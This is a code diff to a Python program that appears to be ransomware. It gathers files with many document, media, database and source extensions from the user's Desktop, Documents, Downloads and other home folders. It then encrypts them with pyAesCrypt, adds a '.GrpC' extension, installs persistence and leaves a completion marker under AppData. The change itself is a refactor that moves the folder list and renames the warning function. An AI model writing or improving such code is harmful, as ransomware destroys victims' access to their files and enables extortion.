@@ -8,11 +8,11 @@ from pyAesCrypt import encryptFile, decryptFile
 project_name = sys.argv[0]
 filext = ".GrpC"
 filelimit = 1024 * 1024 * 1024 # 1 GB
+allowed_dirs = ["Desktop", "Documents", "Downloads", "Music", "Videos", "Pictures"]
 
 def find_files(mode="E"):
     allFiles = []
     valid_extensions = ["doc", "docx", "html", "htm", "odt", "pdf", "xls", "xlsx", "ods", "ppt", "pptx", "txt", "jpeg", "jpg", "png", "gif", "tiff", "psd", "eps", "ai", "indd", "raw", "bmp", "webp", "bat", "svg", "mp4", "avi", "mov", "flv", "wmv", "mpg", "pcm", "wav", "aiff", "mp3", "ogg", "aac", "wma", "flac", "alac", "wma", "rar", "csv", "torrent", "sqlite3", "sqlite", "db", "sql", "accdb", "sln", "suo", "cpp", "c", "cmd", "php", "java", "jar", "mpeg", "mov", "3gp", "mkv", "psd", "bak", "key", "7z", "iso", "bin", "dat", "log", "dbf", "tar", "xml", "py", "rb", "js", "md", "class", "cs", "h", "dll", "mkv" , "mid", "exe", "zip"]
-    allowed_dirs = ["Desktop", "Documents", "Downloads", "Music", "Videos", "Pictures"]
     username = os.path.expanduser("~")
     for dirs in allowed_dirs:
         for root, subfiles, files in os.walk(os.path.join(username, dirs)):
@@ -61,7 +61,7 @@ def genpass():
      password = sha256(password.encode()).hexdigest()
      return password
 
-def createWarnings(check=True):
+def checkCompletion(check=True):
     username = os.path.expanduser("~")
     path = os.path.join(username + "\\AppData\\Roaming\\Microsoft\\Windows\\", ".GrpC")
     if check:
@@ -83,10 +83,10 @@ def start(mode="E"):
     password = genpass()
     files_t = find_files(mode)
     if mode == "E":
-        if createWarnings():
+        if checkCompletion():
             persistence()
             encryptFiles(files_t, password)
-            createWarnings(check=False)
+            checkCompletion(check=False)
     else:
         decryptFiles(files_t, password)
         removepersistence()
